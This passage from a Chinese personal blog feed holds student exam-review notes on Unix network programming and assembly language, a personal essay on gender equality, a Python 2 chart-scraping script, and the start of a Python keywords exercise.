pthread_key_t 变量，第二个参数是一个清理函数，用来在线程释放该线程存储的时候被调用。该函数指针可以设成 NULL ，这样系统将调用默认的清理函数。  </p><p>当线程中需要存储特殊值的时候，可以调用 pthread_setspcific() 。该函数有两个参数，第一个为前面声明的 pthread_key_t 变量，第二个为 void* 变量，这样你可以存储任何类型的值。  </p><p>如果需要取出所存储的值，调用 pthread_getspecific() 。该函数的参数为前面提到的 pthread_key_t 变量，该函数返回 void * 类型的值。  </p><h1 id="I-O复用5种模型的区别"><a href="#I-O复用5种模型的区别" class="headerlink" title="I/O复用5种模型的区别"></a>I/O复用5种模型的区别</h1><p>阻塞，非阻塞，复用，信号驱动，异步<br>这个自己看书，书上有图。  </p><h1 id="IGMP协议在原始套接字中的应用"><a href="#IGMP协议在原始套接字中的应用" class="headerlink" title="IGMP协议在原始套接字中的应用"></a>IGMP协议在原始套接字中的应用</h1><p>我不知道，但是也没有考。sorry。  </p><h1 id="TCP-UDP套接字编程流程模版"><a href="#TCP-UDP套接字编程流程模版" class="headerlink" title="TCP/UDP套接字编程流程模版"></a>TCP/UDP套接字编程流程模版</h1><p>最基础的东西，书上2、3章，自己看图。  </p><h1 id="创建IPV4原始套接字"><a href="#创建IPV4原始套接字" class="headerlink" title="创建IPV4原始套接字"></a>创建IPV4原始套接字</h1><p>1.socket第二个参数设置为sock_raw<br>int ipfd<br>ipfd = socket(AF_INFT,SOCK_RAW,IPPROTO_ICMP)<br>socket函数第三个参数用于指定套接口所使用的协议,如 icmp，igmp，egp<br>2.设置 IP_HDRINCL 套接口选项<br>const int on = 1<br>if(setsockopt (sockfd,IPPROTO_IP,IP_HDRINCL,&amp;on,szeof(on))&lt; 0)<br>下面异常处理<br>3.调用 bind，connect  </p><h1 id="父进程ID和子进程ID的关系"><a href="#父进程ID和子进程ID的关系" class="headerlink" title="父进程ID和子进程ID的关系"></a>父进程ID和子进程ID的关系</h1><p>没有考到，了解一下。<br>在 fork 之后，创建子进程成功<br>子进程中，fork 返回 0<br>父进程中，fork 返回子进程的 pid<br>父进程的 fpid 指向子进程的 pid，子进程没有子进程，于是 fpid 为 0  </p><h1 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h1><p>子进程结束了，父进程尚未等待（wait/waitpid）的时候是僵尸进程<br>所以要 waitpid 函数或者 wait 函数来关闭。<br>waitpid 是另一种 wait 函数，多了 pid 和 option 选项。<br>其中 pid 为子进程 id，-1时等待任何一个，这时和 wait 一样；大于1时，为等待该 pid 的进程<br>option 为 WNOHANG，没有子进程也会立即返回，不会一直等，一般 option 为 0  </p><h1 id="套接字地址结构类型"><a href="#套接字地址结构类型" class="headerlink" title="套接字地址结构类型"></a>套接字地址结构类型</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> sin_len;          <span class="comment">//ipv4地址长度</span></span><br><span class="line">  <span class="keyword">short</span> <span class="keyword">int</span>      sin_family;       <span class="comment">//指代协议簇，在 tcp 中只会是AF_INET</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> sin_port;         <span class="comment">//储存端口号</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>         <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">//储存 IP地址</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  sin_zero[<span class="number">8</span>];      <span class="comment">//保留位，用于保持长度相同</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> s_addr;           <span class="comment">//网络字节序？？？？？？？的 IP地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是 ipv4 的，ipv6 不用记。  </p><h1 id="线程安全性中once函数的使用"><a href="#线程安全性中once函数的使用" class="headerlink" title="线程安全性中once函数的使用"></a>线程安全性中once函数的使用</h1><p>没有考到，了解一下<br>在多线程环境中，有些事仅需要执行一次。通常当初始化应用程序时，可以比较容易地将其放在main函数中。<br>但当你写一个库时，就不能在main里面初始化了，你可以用静态初始化，但使用一次初始化（pthread_once）会比较容易些。<br>int pthread_once(pthread_once_t <em>once_control, void (</em>init_routine) (void))；<br>功能：本函数使用初值为PTHREAD_ONCE_INIT的once_control变量保证init_routine()函数在本进程执行序列中仅执行一次。<br>在多线程编程环境下，尽管pthread_once()调用会出现在多个线程中，init_routine()函数仅执行一次，究竟在哪个线程中执行是不定的，是由内核调度来决定。<br>Linux Threads使用互斥锁和条件变量保证由pthread_once()指定的函数执行且仅执行一次，而once_control表示是否执行过。<br>如果once_control的初值不是PTHREAD_ONCE_INIT（Linux Threads定义为0），pthread_once() 的行为就会不正常。<br>在LinuxThreads中，实际”一次性函数”的执行状态有三种：NEVER（0）、IN_PROGRESS（1）、DONE （2）<br>如果once初值设为1，则由于所有pthread_once()都必须等待其中一个激发”已执行一次”信号，因此所有pthread_once ()都会陷入永久的等待中；如果设为2，则表示该函数已执行过一次，从而所有pthread_once()都会立即返回0。   </p><h1 id="域名和IP、协议和协议号、服务和端口的处理函数"><a href="#域名和IP、协议和协议号、服务和端口的处理函数" class="headerlink" title="域名和IP、协议和协议号、服务和端口的处理函数"></a>域名和IP、协议和协议号、服务和端口的处理函数</h1><p>太多了这个自己看书。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">gethostbyname</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">gethostbyaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">uname</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">gethostname</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">getservbyname</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">getservbyport</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">inet_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">inet_aton</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">inet_ntoa</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p><h1 id="创建守护进程"><a href="#创建守护进程" class="headerlink" title="创建守护进程"></a>创建守护进程</h1><h2 id="1-创建后台进程"><a href="#1-创建后台进程" class="headerlink" title="1 创建后台进程"></a>1 创建后台进程</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((pid = fork())&gt;<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">"fail to fork"</span>);</span><br><span class="line">    <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-创建新会话"><a href="#2-创建新会话" class="headerlink" title="2 创建新会话"></a>2 创建新会话</h2><p>脱离控制终端，登录会话和进程组<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><h2 id="3-禁止进程重新打开控制终端"><a href="#3-禁止进程重新打开控制终端" class="headerlink" title="3 禁止进程重新打开控制终端"></a>3 禁止进程重新打开控制终端</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pid=fork()) </span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);<span class="regexp">//</span>结束第一子进程，第二子进程继续（第二子进程不再是会话组长）</span><br></pre></td></tr></table></figure><h2 id="4-关闭所有文件描述符"><a href="#4-关闭所有文件描述符" class="headerlink" title="4 关闭所有文件描述符"></a>4 关闭所有文件描述符</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;=getdtablesize();<span class="built_in">i</span>++)</span><br><span class="line"> close(<span class="built_in">i</span>);</span><br></pre></td></tr></table></figure><h2 id="5-改变当前工作目录"><a href="#5-改变当前工作目录" class="headerlink" title="5 改变当前工作目录"></a>5 改变当前工作目录</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">"/tmp"</span>) <span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="6-重设权限掩码"><a href="#6-重设权限掩码" class="headerlink" title="6 重设权限掩码"></a>6 重设权限掩码</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umask(<span class="number">0</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="7-处理SIGCHLD信号"><a href="#7-处理SIGCHLD信号" class="headerlink" title="7 处理SIGCHLD信号"></a>7 处理SIGCHLD信号</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="name">SIGCHLD</span>,SIG_IGN)<span class="comment">;</span></span><br></pre></td></tr></table></figure><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>直男癌、平权主义、乌云背后的幸福线、还有前女友</title>
      <link href="/2015/12-11-feminism/"/>
      <url>/2015/12-11-feminism/</url>
      
        <content type="html"><![CDATA[<p>以前写随笔，现在随键盘。<br><a id="more"></a><br>  我忘了具体原因是什么，反正有一天晚上正在复习的时候，跟小良谈到了女权主义。与其说是「谈到」，不如说是「激烈的争论」，直到现在我都还记得到，他谈到了「相夫教子」，然而在那之前我连这个成语什么意思都不知道。  </p><p>  「“相夫教子”，汉字成语、词语，就是辅助丈夫、教育孩子的意思。相、辅助，子、指孩子。“相夫教子”是古代衡量妇女道德水平的一种标准，也是对贤淑妻子的称赞。」——某度百科   </p><p>  然后第二天上课之前小良问我，如果我的女儿嫁了一个比我小几岁的男人，我怎么办的问题，然后在某乎上邀请我回答了这个问题。<br>  卧槽我说真的，女儿嫁什么人，跟老子有锤子关系。  </p><p>  爱自己女儿就行了，你把你女儿教育成一个这样的人人，那么她选择的人，我相信她自己有自己的判断，有什么理由去阻止她呢？  </p><p>  回答中不乏有说死活不干，还有人说「每每想到这，我就不想要女儿了」这样偏激的话。 </p><p>  为什么是不想要女儿了呢？为什么是「每每想到」呢？说出口的时候没有发现，但是感觉问题很大。这个根植到了观念当中，就变成言者无意，听者有心的情况了。是不是也要思考一下这个观念形成时出的问题了呢？  </p><p>  想起来当年在高中的时候，跟一个同性恋的朋友聊天，我说了一句「正常的性取向」，结果被鄙视了很久。  </p><hr><p>  我感觉我是一个支持女权主义的男性。  </p><p>  这个时候应该说平权主义而不是女权主义，因为女权主义听起来就像是女性沙文主义,感觉像是女性对极端权力的追求。这个词语是「女权」加上「主义」构成的，在直觉上来看就带有一种偏见，就跟「黑鬼」一样了，所以说还是叫平权主义比较好。  </p><p>  突然又想起讨论直男癌的那个回答了。<br>  <a href="http://www.zhihu.com/question/26431968" target="_blank" rel="noopener">为什么直男癌在知乎上会引起反对，这个词有广泛侮辱性么？</a>  </p><p>  可以去看一看其他得票较低的回答，基本上都会举例说自己遇见的某一件事情，自己知道的某一个人的行为，而这种行为引起了他的不满，然后能够引起人们在生活中对他人行为不满的共鸣。然后这个回答就变成了「我看谁不满意，只要他是男的，这个行为就是直男癌」。不信自己看，符合这个标准的有点多，跟星座玄学一样，放之四海皆准。  </p><p>  有话好好说，就算是对骂，也要请你讲道理。  </p><p>  回到平权上来，讲真，这个也是对基本人权的追求，然后还经常被人家误解。至少对我来说，追求平权是我的观念上认为「正确」的，是「应该」的。  </p><p>  我希望我的伴侣是跟我享受同样权力、担当同样责任的、拥有独立人格、受社会尊重的人。  </p><p>  想起来自己的上一段恋爱，我自己感觉就是因为我在某些地方太喜欢讲道理了，然后就和感性的女友分手了。前几天看留言板，看到前女友的留言，然后还跑到她留言板上去看，结果我当年的全部都被删除了。。。  </p><p>  好端端的恋爱，莫名其妙就没有了。我是有多可怕，给人家留了一段这样的回忆，必须要删除呢。  </p><p>  刚刚看完乌云背后的幸福线那天晚上真的是兴奋地睡不着啊睡不着，少男心一下子就萌动了你懂。大表姐把理想女友演活了的感觉。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTMLRarser 的使用</title>
      <link href="/2015/11-30-HTMLParser/"/>
      <url>/2015/11-30-HTMLParser/</url>
      
        <content type="html"><![CDATA[<p>记录一下如何使用 HTMLParser<br>这一个跑在 python2.7.10 上，跟以前的那一篇不一样<br>这个我都看得懂，应该很简单了<br><a id="more"></a></p><hr><h1 id="需要处理的信息"><a href="#需要处理的信息" class="headerlink" title="需要处理的信息"></a>需要处理的信息</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"titlt"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/search/singles/SORRY"</span>&gt;</span>SORRY<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>就是把 official ukcharts榜单的关键信息解析出来保存好。</p><hr><h1 id="使用这个-Parser"><a href="#使用这个-Parser" class="headerlink" title="使用这个 Parser"></a>使用这个 Parser</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> HTMLParser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://www.officialcharts.com/charts/singles-chart/"</span></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request = urllib2.Request(url)</span><br><span class="line">response = urllib2.urlopen(request)</span><br><span class="line">rawhtml = response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinksParser</span><span class="params">(HTMLParser.HTMLParser)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        HTMLParser.HTMLParser.__init__(self)</span><br><span class="line">        self.recording = <span class="number">0</span></span><br><span class="line">        self.data = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attributes)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> tag != <span class="string">'div'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.recording:</span><br><span class="line">            self.recording += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> attributes:</span><br><span class="line">            <span class="keyword">if</span> name == <span class="string">'class'</span> <span class="keyword">and</span> value == <span class="string">'title'</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.recording = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_endtag</span><span class="params">(self, tag)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'div'</span> <span class="keyword">and</span> self.recording:</span><br><span class="line">            self.recording -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.recording:</span><br><span class="line">            <span class="comment"># self.data.append(data)</span></span><br><span class="line">            <span class="keyword">if</span> ord(data[<span class="number">0</span>]) != <span class="number">13</span>:</span><br><span class="line">                self.data.append(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linksparser = LinksParser()</span><br><span class="line">linksparser.feed(rawhtml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> linksparser.data:</span><br><span class="line">    <span class="keyword">if</span> ord(i[<span class="number">0</span>]) == <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>使用结果自己尝试，有一个问题就是字符带有<code>&#39;</code>的话就惨了，会被分开储存。<br>我暂时没有想到好的解决办法，就暂时挖个这个坑。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>复习汇编</title>
      <link href="/2015/11-27-assemblyreverse/"/>
      <url>/2015/11-27-assemblyreverse/</url>
      
        <content type="html"><![CDATA[<p>汇编考试终于完了<br>然后把复习资料传一下<br><a id="more"></a></p><hr><h1 id="复习纲要"><a href="#复习纲要" class="headerlink" title="复习纲要"></a>复习纲要</h1><p>老师给的复习纲要，考完了我回来给你说，因为每一个编译器不一样，命令多种多样，考的也简单。<br>填空题都是分散的一个一个的知识点，冷知识一样。<br>大题的话基本上都是给你一段代码，让你说明某一行完了之后寄存器内容，这段代码什么作用。<br>ASCII 里面大写在前面，小写在后面，中间差32，我就记反了。  </p><hr><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h2><p>  ☐ <strong>理解汇编语言与机器语言的区别与联系</strong></p><ul><li>最为接近</li><li>采用助记符指令</li><li>一一对应</li></ul><p>  ☐ <strong>掌握进制转换、与或非运算：该节内容应在大一的时候就已经掌握</strong></p><ul><li>-3.625D=1100.1011B</li><li>八进制O/Q</li><li>十六进制H</li><li>补码取反加一</li></ul><p>  ☐ <strong>了解其它内容</strong></p><h2 id="IA-32处理器体系结构"><a href="#IA-32处理器体系结构" class="headerlink" title="IA-32处理器体系结构:"></a>IA-32处理器体系结构:</h2><p>  ☐ <strong>了解微机的结构</strong></p><ul><li>central processing unit + 内催储存单元 + 输入输出设备 + 数据控制地址总线</li><li>cmos 内存存放微机系统配置</li><li>pcl 声卡显卡现在集成了</li><li>EPROM，一种可擦写的只读存储器</li><li>DRAM，动态随机访问存储器，可读可写，一般容量大，便宜，要求有刷新电路。</li><li>SRAM，静态随机访问存储器，不需刷新电路，常用作缓存</li><li>VRAM,显存，是一种双端口的存储器，CPU可以访问，视频卡也可以访问。</li><li>CMOS RAM，低功耗存储器，用于存储机器配置信息，时钟信息等，通过电池供电。</li></ul><p>  ☐ <strong>掌握IA32处理器的基本执行环境，掌握各寄存器的作用</strong></p><ul><li>ia-32 最大4G-32位地址线 20跟地址线-最大访问量1M</li><li>EAX 扩展累加寄存器 在乘法和除法指令中被自动使用</li><li>EBX 基址寄存器 地址索引</li><li>ECX 循环计数器</li><li>EDX 数据寄存器</li><li>ESI 扩展源指针寄存器 （配合 DS 全局变量）传送指令使用</li><li>EDI 扩展目的指针寄存器 （配合 ES ）传送指令使用</li><li>ESP 扩展堆栈指针寄存器 （配合 SS 指向堆栈）</li><li>EBP 扩展帧指针寄存器  栈低</li><li>CS 指向代码</li><li>EIP 下一条指令 不能使用转移，算数指令修改</li></ul><p>  ☐ <strong>EFLAGS 控制 cpu 操作</strong></p><ul><li>CF 进位 CF 最高位进位借位为 1</li><li>AC 辅助进位 AC 低四位进位借位为 1</li><li>PF 奇偶 PF 1个数为偶数时为 1</li><li>ZF 零 ZF 结果为0时为 1</li><li>SF 符号标志 SF 0正1负</li><li>OF 溢出标志 OF 超出为 1</li><li>DF 串操作 DF 1减0增</li><li>IF 中断屏蔽 IF 0断1不断</li><li>TF 单步执行 TF 1单步执行</li></ul><p>  ☐ <strong>理解指令的运行过程</strong></p><ul><li>查找文件</li><li>获取磁盘位置</li><li>分配内存，文件转入内存</li><li>执行一条跳转指令</li><li>跳转程序的第一条指令</li></ul><p>  ☐ <strong>掌握IA-32处理器有3种基本的操作模式，特别是保护模式与实模式（包括地址计算等）</strong><br>  保护模式-基本</p><ul><li>286开始</li><li>应用分级别，不能访问内存</li><li>32位地址线，4G 寻址0FFFFFFFFH</li><li>段寄存器放段描述符索引</li><li>平坦 - 一段 vs 多段</li></ul><p>  实模式-8086</p><ul><li>20根地址线</li><li>段寄存器放段的基地址</li></ul><p>  ☐ <strong>了解其它内容</strong><br>  分页机制实现线性地址到物理地址的映射，便于实现虚拟内存</p><h2 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础:"></a>汇编语言基础:</h2><p>  ☐ <strong>理解汇编语言的基本要素，能写出完整的汇编程序</strong></p><ul><li>字符串存得时 ascii</li><li>支持()+-*/ mod</li><li>变量第一位不能为数字，1~247个字符</li><li>DB 单字节 8bit</li><li>DW 双字节 16bit</li><li>DD 四字节 32bit</li><li>DQ 八字节 64bit</li><li>Sword 带符号字</li><li>Sdword 带符号四字</li></ul><p>  ☐ <strong>理解汇编程序转换为可执行程序的全过程</strong><br>  ☐ <strong>掌握配置VC6的方法</strong><br>  ☐ <strong>掌握汇编数据定义方法、符号常量的定义方法</strong><br>  ☐ <strong>理解Intel处理器所使用的小端顺序，并能灵活运用。</strong></p><ul><li>0 78h 01111000</li><li>1 56h 01010110</li><li>2 34h 00110100</li><li>3 12h 00010010</li></ul><h2 id="数据传送寻址和算术运算"><a href="#数据传送寻址和算术运算" class="headerlink" title="数据传送寻址和算术运算:"></a>数据传送寻址和算术运算:</h2><p>  ☐ 掌握数据传送指令MOV、XCHG的使用，了解MOVZX、MOVSX、LAHF、SAHF的使用<br>  ☐ 掌握加减运算INC、DEC、ADD、SUB、NEG指令<br>  ☐ 掌握有符号数与无符号数溢出的判断方法<br>  ☐ 掌握OFFSET、PTR、TYPE、LENGTHOF操作符的使用，了解ALIGN、SIZEOF、LABEL的使用<br>  ☐ 掌握寻址方式：间接寻址、变址寻址，了解变址操作数中的比例因子<br>                 括号    括号+数<br>  ☐ 掌握JMP指令和LOOP指令的使用</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程:"></a>过程:</h2><p>  ☐ 掌握push、pop指令，并能理解这些指令对ESP寄存器的影响，了解PUSHFD,POPFD,PUSHAD,POPAD<br>  ☐ 掌握过程(procedure)的定义和调用<br>  ☐ 理解CALL和RET指令对栈的影响，以及其对EIP的影响<br>  ☐ 了解USES的使用</p><h2 id="条件处理"><a href="#条件处理" class="headerlink" title="条件处理:"></a>条件处理:</h2><p>  ☐ 掌握布尔运算指令（AND、OR、XOR、NOT）和比较指令CMP，以及TEST指令<br>  ☐ 了解CLC、STC指令的功能<br>  ☐ 理解数字符号与数字的关系，如数字1与数字符号1，对于后者存在计算机中使用的是它的ASCII代码31h。要求能应用在编程中。<br>  ☐ 掌握条件跳转指令的使用，并能根据数的符号的有无选择正确的条件跳转指令。<br>  ☐ 掌握LOOPZ/LOOPE/LOOPNZ/LOOPNE的使用</p><h2 id="整数算术指令"><a href="#整数算术指令" class="headerlink" title="整数算术指令:"></a>整数算术指令:</h2><p>  ☐ 掌握移位和循环移位指令SHL、SHR、SAL、SAR、ROL、ROR、RCL、RCR的使用，了解指令SHLD、SHRD<br>  ☐ 掌握乘法和除法运算指令MUL、DIV、IMUL、IDIV的使用<br>  ☐ 掌握扩展加减法<br>  （无需了解调整指令）</p><h2 id="高级过程"><a href="#高级过程" class="headerlink" title="高级过程:"></a>高级过程:</h2><p>  ☐ 掌握堆栈框架(Stack Frame)的使用：栈框架的建立，栈的清理，要求能画出栈在调用一个过程中的变化情况；<br>  ☐ 理解通过栈传递参数的原理，能结合EBP来计算参数的位置<br>  ☐ 理解C调用约写与stdcall调用约定的不同点与相同点<br>  ☐ 理解如何在过程中使用局量变量<br>  ☐ 掌握LEA、ENTER、LEAVE指令的<br>  ☐ 了解Local伪指令<br>  ☐ 掌握.stack, .model的使用<br>  ☐ 掌握invoke伪指令的使用，理解它是如何转换为call指令的。<br>  ☐ 了解protod伪指令。</p><h2 id="串操作"><a href="#串操作" class="headerlink" title="串操作:"></a>串操作:</h2><p>  ☐ 掌握串操作指令MOVS、CMPS、SCAS、STOS、LODS的使用<br>  ☐ 理解基址变址寻址，相对基址变址寻址，了解比例因子</p><hr><h1 id="各种操作"><a href="#各种操作" class="headerlink" title="各种操作"></a>各种操作</h1><p>字写得丑，见谅<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1eyfs763xu0j21j42ao7w5.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1eyfs7csv78j21kw1j7kdy.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1eyfs7n0tzaj21kw2cghdt.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/a243ad6cjw1eyfs7wzg5fj21kw23l7wh.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1eyfs876it4j21kw295e81.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1eyfs8e7w17j21kw1awtv5.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1eyfs8lxi0bj21kw1w3quf.jpg" alt=""></p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>笨办法学 Python,习题37</title>
      <link href="/2015/11-20-LearnPythonTheHardWay-ex37/"/>
      <url>/2015/11-20-LearnPythonTheHardWay-ex37/</url>
      
        <content type="html"><![CDATA[<p>复习 Python 中的<strong>符号</strong>和<strong>关键字</strong><br><a id="more"></a>  </p><hr><h1 id="Keywords（关键字）"><a href="#Keywords（关键字）" class="headerlink" title="Keywords（关键字）"></a>Keywords（关键字）</h1><h2 id="and"><a href="#and" class="headerlink" title="and"></a><strong>and</strong></h2><p>逻辑与。从左到右，如果全真返回最后一个真的值，如果有假返回第一个假值<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">print</span> <span class="string">"a"</span> <span class="keyword">and</span> <span class="string">"b"</span># b</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"a"</span> <span class="keyword">and</span> <span class="literal">False</span># <span class="literal">False</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"a"</span> <span class="keyword">and</span> <span class="string">"b"</span> <span class="keyword">and</span> 3# 3</span><br></pre></td></tr></table></figure></p><h2 id="or"><a href="#or" class="headerlink" title="or"></a><strong>or</strong></h2><p>逻辑或。从左到右，如果全假返回最后一个假的值，如果有真返回第一个真值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="keyword">False</span> <span class="keyword">or</span> <span class="keyword">False</span><span class="comment"># Flase</span></span><br><span class="line"><span class="keyword">print</span> <span class="keyword">False</span> 